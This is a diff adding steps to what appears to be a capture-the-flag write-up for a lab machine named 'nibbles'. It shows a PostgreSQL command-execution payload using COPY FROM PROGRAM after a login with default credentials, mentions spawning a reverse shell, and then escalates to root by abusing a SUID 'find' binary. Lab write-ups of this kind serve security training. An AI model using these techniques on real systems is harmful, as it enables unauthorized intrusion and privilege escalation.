@@ -93,8 +93,55 @@ trying to login using default credential `postgres:postgres` and it was success.
 
 Triggering RCE through `postgresql` server. Let's spawn a reverse shell 
 
+>Payload
+
+```
+drop table if exists cmd_exec;
+create table cmd_exec(cmd_output text);
+copy cmd_exec from program 'COMMAND';
+```
+payload to trigger RCE on a postgresql db server. let's spawn a reverse shell.
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/c06d35dc-c852-4d63-a160-3f69b9e12af2)
+
+We got a reverse shell. 
 
 
 
+## Privilege Escalation 
 
+```shell
+postgres@nibbles:/var/lib/postgresql/11/main$ cd
+bash: cd: HOME not set
+postgres@nibbles:/var/lib/postgresql/11/main$ find / -perm -u=s -type f 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/bin/chfn
+/usr/bin/passwd
+/usr/bin/gpasswd
+/usr/bin/chsh
+/usr/bin/fusermount
+/usr/bin/newgrp
+/usr/bin/su
+/usr/bin/mount
+/usr/bin/find
+/usr/bin/sudo
+/usr/bin/umount
+postgres@nibbles:/var/lib/postgresql/11/main$
+```
+looking for suid, we can see a valid `/usr/bin/find` bin we can leverage to get root. let's abuse it. 
 
+```
+postgres@nibbles:/tmp$ find . -exec /bin/sh -p \; -quit
+# whoami 
+root
+# id
+uid=106(postgres) gid=113(postgres) euid=0(root) groups=113(postgres),112(ssl-cert)
+# 
+```
+and we got root. 
+
+![image](https://github.com/n16hth4wk07/n16hth4wk07.github.io/assets/87468669/0759e911-ff3e-4a14-a74b-23977f5fa28a)
+
+And we are through 
